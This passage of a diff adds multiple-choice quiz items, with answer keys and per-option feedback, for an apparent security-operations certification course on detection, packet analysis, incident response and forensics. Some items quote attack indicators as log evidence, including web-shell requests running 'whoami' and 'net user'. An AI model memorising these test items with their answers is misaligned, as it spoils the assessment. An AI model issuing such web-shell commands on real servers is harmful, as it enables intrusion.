+    [
+     "False negative",
+     "Right. A real attack happened and nothing alerted."
+    ],
+    [
+     "False positive",
+     "A false positive is an alert with no real attack."
+    ],
+    [
+     "True negative",
+     "True negative means no attack and no alert."
+    ],
+    [
+     "True positive",
+     "A true positive needs an alert."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-4-05",
+   "d": "4.0",
+   "obj": "4.2",
+   "q": "An IDS alerts on a port scan. It turns out to be the security team's own scheduled, approved vulnerability scan. How should the analyst classify it?",
+   "o": [
+    [
+     "Benign",
+     "Right. The alert was accurate, but the activity was approved and harmless."
+    ],
+    [
+     "False negative",
+     "An alert did fire."
+    ],
+    [
+     "True positive needing a response",
+     "The activity was approved, so no incident response is needed."
+    ],
+    [
+     "True negative",
+     "An alert fired, so it isn't a negative."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-4-06",
+   "d": "4.0",
+   "obj": "4.2",
+   "q": "An IDS flags a large file upload as exfiltration. The analyst confirms it's the normal nightly backup to the company's own cloud tenant. Which outcome is this?",
+   "o": [
+    [
+     "False positive",
+     "Right. The alert called normal traffic an attack."
+    ],
+    [
+     "True positive",
+     "There was no attack."
+    ],
+    [
+     "False negative",
+     "False negatives are missed attacks."
+    ],
+    [
+     "Benign",
+     "Benign means the detection was accurate, like an approved scan. Here it misread a normal backup as exfiltration."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-4-07",
+   "d": "4.0",
+   "obj": "4.3",
+   "q": "An attacker sends SQL injection inside normal HTTP on TCP 80. Which device can spot it?",
+   "o": [
+    [
+     "One with deep packet inspection",
+     "Right. DPI reads the application payload, where the injection is."
+    ],
+    [
+     "A stateless packet filter",
+     "It only checks headers like IPs and ports."
+    ],
+    [
+     "A stateful firewall without any payload inspection",
+     "It tracks sessions but doesn't read payloads."
+    ],
+    [
+     "A Layer 2 switch",
+     "Switches forward frames by MAC address."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-4-08",
+   "d": "4.0",
+   "obj": "4.3",
+   "q": "A stateless ACL lets inside users reach web sites. Why must the admin also add a wide rule for return traffic?",
+   "o": [
+    [
+     "It doesn't track sessions, so replies look new",
+     "Right. Without state, the filter can't tell a reply from a new inbound packet."
+    ],
+    [
+     "Return traffic always uses UDP",
+     "Web replies use TCP."
+    ],
+    [
+     "Stateless filters block every TCP ACK packet by default",
+     "Defaults depend on the rules written."
+    ],
+    [
+     "Replies come from a different router",
+     "The path isn't the reason."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-4-09",
+   "d": "4.0",
+   "obj": "4.3",
+   "q": "A stateful firewall sees an inbound TCP ACK that matches no open connection. What does it do by default?",
+   "o": [
+    [
+     "Drop it, since it fits no session",
+     "Right. Stateful firewalls track sessions and drop packets that don't fit one."
+    ],
+    [
+     "Allow it, because ACKs are always replies",
+     "An ACK with no session is a sign of scanning or spoofing."
+    ],
+    [
+     "Send it to deep packet inspection for a payload check first",
+     "Stateful logic drops it before any payload check."
+    ],
+    [
+     "Turn it into a SYN",
+     "Firewalls don't rewrite flags like that."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-4-10",
+   "d": "4.0",
+   "obj": "4.4",
+   "q": "Policy says detected exploit attempts must be stopped before they reach the server. How must the sensor be deployed?",
+   "o": [
+    [
+     "Inline, as an IPS",
+     "Right. Only a device in the traffic path can drop packets."
+    ],
+    [
+     "On a SPAN port",
+     "A SPAN port gets a copy. It can't block."
+    ],
+    [
+     "On a network tap",
+     "A tap gets a copy and can't stop the original."
+    ],
+    [
+     "As a NetFlow collector",
+     "NetFlow summarizes traffic after the fact."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-4-11",
+   "d": "4.0",
+   "obj": "4.4",
+   "q": "What is a main RISK of putting a sensor inline compared with a tap?",
+   "o": [
+    [
+     "Added latency and a failure point",
+     "Right. If an inline device fails closed, traffic stops. If it fails open, protection stops."
+    ],
+    [
+     "It can't see any traffic",
+     "Inline devices see every packet that passes."
+    ],
+    [
+     "It can only read NetFlow",
+     "Inline sensors read full packets."
+    ],
+    [
+     "It needs every protected host to run an agent",
+     "Inline sensors are agentless."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-4-12",
+   "d": "4.0",
+   "obj": "4.4",
+   "q": "A busy switch's SPAN port sometimes drops packets during peaks. Which option gives a more complete copy for monitoring?",
+   "o": [
+    [
+     "A passive network tap",
+     "Right. A tap copies every frame on the wire, without the switch picking what to send."
+    ],
+    [
+     "A second SPAN session on the same switch",
+     "It shares the same switch limits."
+    ],
+    [
+     "Turning on NetFlow",
+     "NetFlow summarizes. It doesn't copy packets."
+    ],
+    [
+     "An inline IPS set to drop mode",
+     "That changes traffic. It isn't a fuller monitoring copy."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-4-13",
+   "d": "4.0",
+   "obj": "4.5",
+   "q": "Leadership wants a year of who-talked-to-whom records for every host, with little storage. Which source fits BEST?",
+   "o": [
+    [
+     "NetFlow",
+     "Right. Flow records are small, so a year of them is affordable."
+    ],
+    [
+     "Full packet capture from a tap",
+     "A year of full packets would need huge storage."
+    ],
+    [
+     "IDS alerts only",
+     "Alerts cover only what rules flag."
+    ],
+    [
+     "Antivirus logs",
+     "Antivirus doesn't record connections."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-4-14",
+   "d": "4.0",
+   "obj": "4.5",
+   "q": "An analyst must rebuild a PDF a host downloaded last night. Which data source makes this possible?",
+   "o": [
+    [
+     "Full packets captured from a tap",
+     "Right. The payload is needed to rebuild the file."
+    ],
+    [
+     "NetFlow",
+     "NetFlow shows the download happened, not its content."
+    ],
+    [
+     "DHCP logs",
+     "DHCP has no file content."
+    ],
+    [
+     "Firewall session logs",
+     "Session logs don't keep payloads."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-4-15",
+   "d": "4.0",
+   "obj": "4.5",
+   "q": "Compared with full captures, what can NetFlow NOT tell you about a suspicious session?",
+   "o": [
+    [
+     "What data was inside the packets",
+     "Right. NetFlow records metadata, not content."
+    ],
+    [
+     "The source and destination IP addresses of the session",
+     "NetFlow records both."
+    ],
+    [
+     "How many bytes moved",
+     "Byte counts are in every flow record."
+    ],
+    [
+     "When the session started",
+     "Start and end times are recorded."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-4-16",
+   "d": "4.0",
+   "obj": "4.6",
+   "q": "In Wireshark, what is the QUICKEST way to save an executable that was downloaded over plain HTTP in a PCAP?",
+   "o": [
+    [
+     "File > Export Objects > HTTP",
+     "Right. Wireshark rebuilds files sent over HTTP from the stream."
+    ],
+    [
+     "Statistics > Conversations",
+     "This lists talkers. It doesn't save files."
+    ],
+    [
+     "Edit > Preferences > Name Resolution",
+     "This changes how names are shown."
+    ],
+    [
+     "Apply a display filter of tcp.port == 80 and save",
+     "A filter narrows the view but doesn't extract anything."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-4-17",
+   "d": "4.0",
+   "obj": "4.6",
+   "q": "Follow TCP Stream shows a file transfer, but the exported file won't open. The capture is missing many segments. Why?",
+   "o": [
+    [
+     "Gaps in the stream corrupt the file",
+     "Right. Missing segments mean missing bytes, so the file is corrupt."
+    ],
+    [
+     "Wireshark can't export files carried over TCP",
+     "Wireshark exports files from TCP streams all the time."
+    ],
+    [
+     "The file was too small to export",
+     "Size isn't the issue."
+    ],
+    [
+     "Export only works on UDP",
+     "Export works on TCP-based protocols like HTTP and SMB."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-4-18",
+   "d": "4.0",
+   "obj": "4.6",
+   "q": "An analyst tries Export Objects on a malware download over HTTPS. Nothing appears. What is the MOST likely reason?",
+   "o": [
+    [
+     "No TLS keys were loaded",
+     "Right. Without session keys, Wireshark can't see the HTTP inside TLS."
+    ],
+    [
+     "HTTPS doesn't use TCP",
+     "HTTPS normally runs over TCP."
+    ],
+    [
+     "The file was compressed before it was sent",
+     "Compression doesn't hide objects from export."
+    ],
+    [
+     "Wireshark only exports images",
+     "It exports many file types."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-4-19",
+   "d": "4.0",
+   "obj": "4.7",
+   "q": "A PCAP shows 10.0.0.5:51515 -> 10.0.0.20:445 [SYN], then 10.0.0.20:445 -> 10.0.0.5:51515 [SYN, ACK]. Which host started the connection?",
+   "o": [
+    [
+     "10.0.0.5",
+     "Right. The host that sends the first SYN is the client that started it."
+    ],
+    [
+     "10.0.0.20",
+     "It replied with SYN-ACK, so it's the server."
+    ],
+    [
+     "Neither, because both sent SYN",
+     "Only one host sent a plain SYN."
+    ],
+    [
+     "The default gateway",
+     "The gateway isn't in this exchange."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-4-20",
+   "d": "4.0",
+   "obj": "4.7",
+   "q": "In one PCAP, a host connects to TCP 4444 on an outside IP and the payload starts with MZ. What does this suggest?",
+   "o": [
+    [
+     "A Windows executable on an odd port",
+     "Right. MZ is the header of Windows executables, and 4444 is a common attack tool port."
+    ],
+    [
+     "A normal web page load from a content server",
+     "Web traffic uses 80 or 443 and starts with HTTP headers."
+    ],
+    [
+     "A DNS lookup",
+     "DNS uses port 53."
+    ],
+    [
+     "An email being sent",
+     "SMTP uses 25 or 587 and starts with text commands."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-4-21",
+   "d": "4.0",
+   "obj": "4.7",
+   "q": "Which PCAP clue BEST tells you which side is the server in a TCP session?",
+   "o": [
+    [
+     "It listens on a well-known port",
+     "Right. Servers listen on known ports. Clients pick random high ports."
+    ],
+    [
+     "It has the higher IP address",
+     "IP values say nothing about roles."
+    ],
+    [
+     "It sends more packets than the other side",
+     "Clients can send more, like during uploads."
+    ],
+    [
+     "It has the lower TTL",
+     "TTL depends on the OS and distance."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-4-22",
+   "d": "4.0",
+   "obj": "4.8",
+   "q": "A scan sends TCP packets with the FIN, PSH and URG flags set to many ports. What is it?",
+   "o": [
+    [
+     "An Xmas scan",
+     "Right. FIN, PSH and URG together light up the header like a tree."
+    ],
+    [
+     "A SYN scan",
+     "A SYN scan sets only SYN."
+    ],
+    [
+     "A NULL scan",
+     "A NULL scan sets no flags."
+    ],
+    [
+     "A normal session teardown",
+     "Teardown uses FIN and ACK, not PSH and URG together."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-4-23",
+   "d": "4.0",
+   "obj": "4.8",
+   "q": "A host claiming to be a Linux web server sends replies with an IP TTL of 127, one hop away. What does this hint?",
+   "o": [
+    [
+     "It may be Windows, which starts at 128",
+     "Right. Windows usually starts at 128 and Linux at 64."
+    ],
+    [
+     "It's a Linux host with a nearly full disk",
+     "Disk space doesn't change TTL."
+    ],
+    [
+     "The packets were encrypted",
+     "Encryption doesn't change TTL."
+    ],
+    [
+     "It's using IPv6",
+     "IPv6 uses Hop Limit, and 127 doesn't mean IPv6."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-4-24",
+   "d": "4.0",
+   "obj": "4.8",
+   "q": "Captures show many unsolicited ARP replies saying 192.168.1.1 is at aa:bb:cc:11:22:33, but the router's real MAC is different. What is this?",
+   "o": [
+    [
+     "ARP spoofing",
+     "Right. Fake replies claim the gateway's IP to pull its traffic."
+    ],
+    [
+     "A normal DHCP renewal",
+     "DHCP doesn't send ARP replies for the gateway."
+    ],
+    [
+     "An ICMP redirect",
+     "ICMP redirects are a separate protocol."
+    ],
+    [
+     "A broadcast storm",
+     "A storm is a flood of broadcasts, not fake replies."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-4-25",
+   "d": "4.0",
+   "obj": "4.8",
+   "q": "DNS logs show one host asking for TXT records thousands of times an hour, with replies near maximum size. What does this suggest?",
+   "o": [
+    [
+     "DNS tunneling",
+     "Right. Large, frequent TXT replies are a common sign of DNS tunneling."
+    ],
+    [
+     "Normal email checks such as SPF lookups",
+     "Mail checks make a few TXT lookups, not thousands."
+    ],
+    [
+     "A DHCP problem",
+     "DHCP doesn't use DNS TXT records."
+    ],
+    [
+     "A slow web page",
+     "Web pages query A and AAAA records, not huge TXT records."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-4-26",
+   "d": "4.0",
+   "obj": "4.9",
+   "q": "A sandbox trace shows VirtualAllocEx, WriteProcessMemory and CreateRemoteThread aimed at explorer.exe. What is happening?",
+   "o": [
+    [
+     "Process injection",
+     "Right. Allocating and writing memory in another process, then starting a thread there, is classic injection."
+    ],
+    [
+     "A normal print job",
+     "Printing doesn't write into Explorer's memory."
+    ],
+    [
+     "File encryption",
+     "No file API calls appear."
+    ],
+    [
+     "A DNS lookup",
+     "DNS uses other APIs."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-4-27",
+   "d": "4.0",
+   "obj": "4.9",
+   "q": "Web logs show: GET /uploads/img.php?c=whoami 200 and GET /uploads/img.php?c=net+user 200. What does this MOST likely show?",
+   "o": [
+    [
+     "A web shell",
+     "Right. A script in an upload folder taking commands in a parameter is a web shell."
+    ],
+    [
+     "Image thumbnails being made on upload",
+     "Thumbnails don't take commands like whoami."
+    ],
+    [
+     "A normal login page",
+     "Login pages don't run net user."
+    ],
+    [
+     "A broken link check",
+     "Link checkers don't send OS commands."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-4-28",
+   "d": "4.0",
+   "obj": "4.9",
+   "q": "An alert: process winword.exe started powershell.exe, which connected to 198.51.100.50:8080. Which artifact is MOST suspicious?",
+   "o": [
+    [
+     "Word starting PowerShell",
+     "Right. An Office app launching a shell often means a malicious macro."
+    ],
+    [
+     "The use of port 8080",
+     "8080 is common for proxies and web apps."
+    ],
+    [
+     "Word running at all",
+     "Word is normal on a desktop."
+    ],
+    [
+     "The destination being an IPv4 address",
+     "IPv4 destinations are normal."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-4-29",
+   "d": "4.0",
+   "obj": "4.10",
+   "q": "Which regex matches a lowercase or capital 'admin' as a whole word, but not 'sysadmin'?",
+   "o": [
+    [
+     "\\b[Aa]dmin\\b",
+     "Right. \\b marks word boundaries, and [Aa] allows either case."
+    ],
+    [
+     "admin.*",
+     "This matches 'admin' anywhere, including inside 'sysadmin'."
+    ],
+    [
+     "^Admin",
+     "This needs Admin at the start of the line and misses lowercase."
+    ],
+    [
+     "[admin]",
+     "Square brackets match one character, not the word."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-4-30",
+   "d": "4.0",
+   "obj": "4.10",
+   "q": "An analyst wants a literal match on example.com in logs. Why write example\\.com instead of example.com?",
+   "o": [
+    [
+     "An unescaped dot matches any one character",
+     "Right. Without the backslash, examplexcom would match too."
+    ],
+    [
+     "The backslash makes the match case-insensitive",
+     "Backslash escaping doesn't change case."
+    ],
+    [
+     "Dots aren't allowed in regex",
+     "Dots are allowed. They just mean any character."
+    ],
+    [
+     "It stops the regex from matching subdomains",
+     "It doesn't stop subdomains from matching."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-4-31",
+   "d": "4.0",
+   "obj": "4.10",
+   "q": "Which lines does grep -E 'Failed password for (invalid user )?root' match?",
+   "o": [
+    [
+     "Both forms, with or without 'invalid user '",
+     "Right. The ? makes the group optional, so it matches with or without it."
+    ],
+    [
+     "Only lines with 'Failed password for invalid user root'",
+     "The ? means the group can be missing."
+    ],
+    [
+     "Any line with 'root' anywhere",
+     "The whole phrase must match."
+    ],
+    [
+     "Only successful root logins",
+     "The pattern looks for 'Failed password'."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-5-01",
+   "d": "5.0",
+   "obj": "5.1",
+   "q": "A new SOC finds that nobody knows how many servers the company has. Which program should come FIRST?",
+   "o": [
+    [
+     "Asset management",
+     "Right. You can't protect, patch or monitor what you don't know you have."
+    ],
+    [
+     "Patch management",
+     "Patching needs a list of what to patch."
+    ],
+    [
+     "Mobile device management",
+     "MDM covers phones and tablets only."
+    ],
+    [
+     "Penetration testing",
+     "Testing comes after you know your assets."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-5-02",
+   "d": "5.0",
+   "obj": "5.1",
+   "q": "A server's firewall rules no longer match the approved baseline, and nobody filed a change request. Which practice catches and prevents this drift?",
+   "o": [
+    [
+     "Configuration management",
+     "Right. Baselines and change control keep systems in a known state."
+    ],
+    [
+     "Asset management",
+     "Asset management tracks what exists, not how it's set up."
+    ],
+    [
+     "Vulnerability management",
+     "Vulnerability management finds weaknesses. It doesn't own baselines."
+    ],
+    [
+     "Incident response",
+     "IR handles incidents after they happen."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-5-03",
+   "d": "5.0",
+   "obj": "5.1",
+   "q": "An employee loses a company phone with work email on it. Which tool lets the SOC wipe work data from it remotely?",
+   "o": [
+    [
+     "Mobile device management",
+     "Right. MDM can lock, locate and wipe enrolled devices."
+    ],
+    [
+     "NetFlow",
+     "NetFlow sees traffic, not devices."
+    ],
+    [
+     "A web proxy",
+     "A proxy filters web traffic only."
+    ],
+    [
+     "Configuration management database",
+     "A CMDB records configuration. It can't wipe a device."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-5-04",
+   "d": "5.0",
+   "obj": "5.1",
+   "q": "How does vulnerability management differ from patch management?",
+   "o": [
+    [
+     "It's the whole cycle; patching is one fix",
+     "Right. Vulnerability management is the whole cycle. Patching is one way to fix what it finds."
+    ],
+    [
+     "They are the same thing",
+     "Patching is only one part."
+    ],
+    [
+     "Patch management is the part that finds the weaknesses",
+     "Scanning and ranking belong to vulnerability management."
+    ],
+    [
+     "Vulnerability management only covers phones",
+     "It covers every kind of asset."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-5-05",
+   "d": "5.0",
+   "obj": "5.2",
+   "q": "Under NIST SP 800-61, which item belongs in the incident response PLAN, not a procedure?",
+   "o": [
+    [
+     "Management approval and a maturity roadmap",
+     "Right. The plan holds the mission, goals, approval, approach, communication, metrics and roadmap."
+    ],
+    [
+     "Step-by-step commands to image a suspect laptop",
+     "Detailed steps are procedures."
+    ],
+    [
+     "The router's admin password",
+     "Credentials don't belong in the plan."
+    ],
+    [
+     "A list of every past alert",
+     "Alert history is data, not plan content."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-5-06",
+   "d": "5.0",
+   "obj": "5.2",
+   "q": "Which of these is an element NIST SP 800-61 lists for an incident response plan?",
+   "o": [
+    [
+     "Metrics for the IR capability",
+     "Right. The plan includes metrics to track how well IR works."
+    ],
+    [
+     "A copy of the firewall ruleset",
+     "A ruleset is configuration."
+    ],
+    [
+     "Each analyst's home address",
+     "Personal details aren't plan elements."
+    ],
+    [
+     "The SIEM's current correlation rules",
+     "Detection rules are technical content."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-5-07",
+   "d": "5.0",
+   "obj": "5.2",
+   "q": "A team writes down how it will share updates with management, legal and other teams during an incident. Which part of the IR plan is this?",
+   "o": [
+    [
+     "How the team talks to the organization",
+     "Right. Communication with other groups is a core plan element."
+    ],
+    [
+     "The evidence retention procedure",
+     "Retention is a separate topic."
+    ],
+    [
+     "The lessons-learned report",
+     "Lessons learned come after an incident."
+    ],
+    [
+     "The detailed containment strategy for ransomware",
+     "Containment strategies are specific to incident types."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-5-08",
+   "d": "5.0",
+   "obj": "5.3",
+   "q": "An analyst confirms ransomware on one workstation that is still on the network. What should happen NEXT?",
+   "o": [
+    [
+     "Isolate it from the network",
+     "Right. Containment stops the spread. Keeping it powered on saves memory evidence."
+    ],
+    [
+     "Power it off right away",
+     "Powering off loses volatile evidence. Isolate it instead."
+    ],
+    [
+     "Restore it from last night's backup",
+     "Restoring comes after containment and eradication."
+    ],
+    [
+     "Write the lessons-learned report",
+     "That's the last phase."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-5-09",
+   "d": "5.0",
+   "obj": "5.3",
+   "q": "A user reports a phishing email. The analyst confirms the link is malicious. Before containment, what should the analyst find out?",
+   "o": [
+    [
+     "Who else got it and who clicked",
+     "Right. Scoping during analysis shows how far it spread."
+    ],
+    [
+     "The attacker's real name",
+     "Attribution isn't needed to contain."
+    ],
+    [
+     "The user's job title",
+     "That doesn't scope the incident."
+    ],
+    [
+     "Which antivirus vendor has the cheapest license",
+     "Not relevant here."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-5-10",
+   "d": "5.0",
+   "obj": "5.3",
+   "q": "Malware has been removed and the root cause patched. Systems are restored from clean backups. What should the team do during recovery?",
+   "o": [
+    [
+     "Watch for signs of reinfection",
+     "Right. Recovery includes monitoring to confirm the threat is gone."
+    ],
+    [
+     "Delete all logs from the incident",
+     "Logs are needed for review and evidence."
+    ],
+    [
+     "Turn off the IDS for a while to cut alert noise",
+     "Monitoring matters most right after recovery."
+    ],
+    [
+     "Close the ticket with no review",
+     "A post-incident review still follows."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-5-11",
+   "d": "5.0",
+   "obj": "5.4",
+   "q": "Building a jump kit with forensic laptops, write blockers and cables happens in which NIST SP 800-61 phase?",
+   "o": [
+    [
+     "Preparation",
+     "Right. Tools and training are set up before an incident."
+    ],
+    [
+     "Detection and analysis",
+     "That phase is about finding and confirming incidents."
+    ],
+    [
+     "Containment, eradication and recovery",
+     "That phase uses the tools, it doesn't build them."
+    ],
+    [
+     "Post-incident activity",
+     "That phase reviews the incident."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-5-12",
+   "d": "5.0",
+   "obj": "5.4",
+   "q": "Deciding how serious an incident is and ranking it against others happens in which phase?",
+   "o": [
+    [
+     "Detection and analysis",
+     "Right. Prioritizing based on impact is part of analysis."
+    ],
+    [
+     "Preparation",
+     "Preparation sets up the process, but ranking real incidents happens during analysis."
+    ],
+    [
+     "Containment, eradication and recovery",
+     "That phase acts on the ranking."
+    ],
+    [
+     "Post-incident activity",
+     "That phase is after the incident."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-5-13",
+   "d": "5.0",
+   "obj": "5.4",
+   "q": "Under NIST SP 800-61, deciding how long to keep evidence after an incident belongs to which phase?",
+   "o": [
+    [
+     "Post-incident activity",
+     "Right. Evidence retention is covered with lessons learned."
+    ],
+    [
+     "Preparation",
+     "Preparation sets up tools and policy, but retention decisions for a closed incident come after."
+    ],
+    [
+     "Detection and analysis",
+     "That phase gathers evidence. It doesn't decide retention."
+    ],
+    [
+     "Containment, eradication and recovery",
+     "That phase stops and removes the threat."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-5-14",
+   "d": "5.0",
+   "obj": "5.5",
+   "q": "An incident may have exposed customer data. Which stakeholder decides whether the law requires notifying customers or regulators?",
+   "o": [
+    [
+     "Legal counsel",
+     "Right. Legal reviews notification and liability duties."
+    ],
+    [
+     "The help desk",
+     "The help desk supports users. It doesn't decide legal duties."
+    ],
+    [
+     "The network team",
+     "The network team handles containment work."
+    ],
+    [
+     "The SIEM vendor",
+     "Vendors don't decide your legal duties."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-5-15",
+   "d": "5.0",
+   "obj": "5.5",
+   "q": "Reporters start calling about a breach. Who should speak to the media?",
+   "o": [
+    [
+     "Public affairs",
+     "Right. One trained voice keeps the message accurate and consistent."
+    ],
+    [
+     "The analyst who found the breach first",
+     "Analysts shouldn't talk to the press."
+    ],
+    [
+     "Any manager who answers the phone",
+     "Uncoordinated answers cause confusion."
+    ],
+    [
+     "The SOC shift lead on duty",
+     "The SOC works the incident. Media questions go to public affairs."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-5-16",
+   "d": "5.0",
+   "obj": "5.5",
+   "q": "A defense contractor that handles Controlled Unclassified Information finds a breach. Under DFARS 252.204-7012, which is TRUE?",
+   "o": [
+    [
+     "It must report the incident to the DoD within 72 hours",
+     "Right. The clause requires rapid reporting within 72 hours of discovery."
+    ],
+    [
+     "It only has to report incidents with more than 1,000 records",
+     "No record threshold applies."
+    ],
+    [
+     "It can wait until the investigation is finished",
+     "Reporting can't wait for the full investigation."
+    ],
+    [
+     "It reports only to its own insurer",
+     "The DoD must be told."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-5-17",
+   "d": "5.0",
+   "obj": "5.6",
+   "q": "Following order of volatility, which should be collected FIRST from a running server?",
+   "o": [
+    [
+     "Memory (RAM)",
+     "Right. RAM is lost at power-off, so it comes before disks and backups."
+    ],
+    [
+     "The hard disk",
+     "Disks keep data after power-off, so they come later."
+    ],
+    [
+     "Backup tapes",
+     "Archives are the least volatile."
+    ],
+    [
+     "Printed reports",
+     "Paper isn't volatile at all."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-5-18",
+   "d": "5.0",
+   "obj": "5.6",
+   "q": "An analyst images a disk with a write blocker and records the image's SHA-256 before and after analysis. What does this protect?",
+   "o": [
+    [
+     "Data integrity",
+     "Right. Matching hashes show the evidence didn't change."
+    ],
+    [
+     "Data availability",
+     "Availability isn't the goal of hashing evidence."
+    ],
+    [
+     "Network throughput",
+     "Not related."
+    ],
+    [
+     "Volatile data",
+     "Disk images aren't volatile."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-5-19",
+   "d": "5.0",
+   "obj": "5.6",
+   "q": "Why does NIST SP 800-86 say to analyze a COPY of the evidence instead of the original?",
+   "o": [
+    [
+     "It keeps the original unchanged",
+     "Right. Working on a verified copy keeps the original unchanged."
+    ],
+    [
+     "Copies run faster on every tool",
+     "Speed isn't the reason."
+    ],
+    [
+     "Originals can't be hashed",
+     "Originals can and should be hashed."
+    ],
+    [
+     "Copies don't need any chain of custody",
+     "Copies need custody records too."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-5-20",
+   "d": "5.0",
+   "obj": "5.7",
+   "q": "One workstation keeps a single TCP session open to an outside IP for 19 hours. Most user sessions last minutes. Which profiling element shows this?",
+   "o": [
+    [
+     "Session duration",
+     "Right. Very long sessions to unknown hosts can mean C2 or exfiltration."
+    ],
+    [
+     "Total throughput",
+     "Throughput is about volume, not how long a session lasts."
+    ],
+    [
+     "Critical asset address space",
+     "That element is about which address ranges matter most."
+    ],
+    [
+     "Ports used",
+     "The port isn't the point here."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-5-21",
+   "d": "5.0",
+   "obj": "5.7",
+   "q": "Why should a SOC know the critical asset address space?",
+   "o": [
+    [
+     "Alerts there can be ranked higher",
+     "Right. Knowing where the crown jewels sit speeds triage."
+    ],
+    [
+     "It lets the SOC turn off logging everywhere else",
+     "Other ranges still need monitoring."
+    ],
+    [
+     "It replaces the need for NetFlow",
+     "It adds context. It doesn't replace data."
+    ],
+    [
+     "It shows every user's password",
+     "Address space has nothing to do with passwords."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-5-22",
+   "d": "5.0",
+   "obj": "5.7",
+   "q": "A subnet's total throughput is usually 50 Mbps. At 03:00 it jumps to 900 Mbps outbound. What is this an example of?",
+   "o": [
+    [
+     "A baseline change worth a look",
+     "Right. A big jump against the normal profile is a lead."
+    ],
+    [
+     "Normal traffic, because throughput always varies",
+     "Some change is normal. An 18x spike at 03:00 isn't."
+    ],
+    [
+     "A DHCP problem",
+     "DHCP doesn't push hundreds of Mbps."
+    ],
+    [
+     "Proof of a DDoS attack against the subnet",
+     "Outbound volume points to the subnet sending, not being hit."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-5-23",
+   "d": "5.0",
+   "obj": "5.8",
+   "q": "A web server that only ever listened on 80 and 443 is now listening on TCP 31337. Which server profiling element caught this?",
+   "o": [
+    [
+     "Listening ports",
+     "Right. A new listening port on a known server is a red flag."
+    ],
+    [
+     "Logged-in users",
+     "No user change is described."
+    ],
+    [
+     "Running tasks",
+     "Tasks aren't mentioned."
+    ],
+    [
+     "Total throughput",
+     "That's a network profiling element."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-5-24",
+   "d": "5.0",
+   "obj": "5.8",
+   "q": "The service account svc_sql normally runs only the database service. Logs show it signing in interactively through Remote Desktop. Why is this suspicious?",
+   "o": [
+    [
+     "Service accounts shouldn't log on interactively",
+     "Right. A service account used by a person suggests stolen credentials."
+    ],
+    [
+     "Service accounts can't use passwords",
+     "Service accounts do use credentials."
+    ],
+    [
+     "RDP never works on servers",
+     "RDP is common on Windows servers."
+    ],
+    [
+     "Database servers don't need service accounts at all",
+     "Most do."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-5-25",
+   "d": "5.0",
+   "obj": "5.8",
+   "q": "A new scheduled task named UpdaterSvc runs a PowerShell script from C:\\ProgramData every hour on a file server. Which profiling element shows the change?",
+   "o": [
+    [
+     "Running tasks",
+     "Right. New scheduled tasks are a common persistence method."
+    ],
+    [
+     "Listening ports",
+     "No new port is described."
+    ],
+    [
+     "Session duration",
+     "That's a network profiling element."
+    ],
+    [
+     "Logged-in users",
+     "No logon is described."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-5-26",
+   "d": "5.0",
+   "obj": "5.9",
+   "q": "A spreadsheet holds patient names, dates of birth and diagnoses. What type of protected data is this?",
+   "o": [
+    [
+     "PHI",
+     "Right. Health details tied to a person are protected health information."
+    ],
+    [
+     "Intellectual property",
+     "IP covers creations like designs and code."
+    ],
+    [
+     "Public data",
+     "Patient records aren't public."
+    ],
